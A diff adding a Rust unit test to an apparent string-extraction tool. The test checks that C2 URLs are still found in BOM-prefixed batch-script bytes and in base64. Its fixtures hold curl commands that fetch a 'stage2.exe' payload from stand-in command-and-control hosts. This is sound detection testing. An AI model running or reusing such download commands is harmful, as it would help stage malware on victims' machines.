@@ -539,3 +539,33 @@ fn test_dissect_vs_bare_options() {
         "DISSECT options should also decode hex"
     );
 }
+
+/// A UTF-16 BOM in front of 8-bit text must not hide it, even when the text
+/// carries a stray NUL or invalid UTF-8 byte, and its encoded payloads must
+/// still be decoded.
+#[test]
+fn test_bom_prefixed_8bit_text_is_not_decoded_as_utf16() {
+    let mut nul = b"\xFF\xFE@echo off\r\nrem \x00\r\n".to_vec();
+    nul.extend_from_slice(b"curl http://c2-evil-domain.ru/stage2.exe\r\n");
+    let mut high = b"\xFF\xFE@echo off\r\nrem \x80\r\n".to_vec();
+    high.extend_from_slice(b"curl http://c2-evil-domain.ru/stage2.exe\r\n");
+    for data in [nul, high] {
+        let strings = stng::extract_strings(&data, 4);
+        assert!(
+            strings
+                .iter()
+                .any(|s| s.value.contains("c2-evil-domain.ru")),
+            "{strings:?}"
+        );
+    }
+
+    // `curl http://hidden-c2-payload.ru/x` as base64.
+    let encoded = b"\xFF\xFEset p=Y3VybCBodHRwOi8vaGlkZGVuLWMyLXBheWxvYWQucnUveA==\r\n";
+    let strings = stng::extract_strings(encoded, 4);
+    assert!(
+        strings
+            .iter()
+            .any(|s| s.value.contains("hidden-c2-payload.ru")),
+        "{strings:?}"
+    );
+}
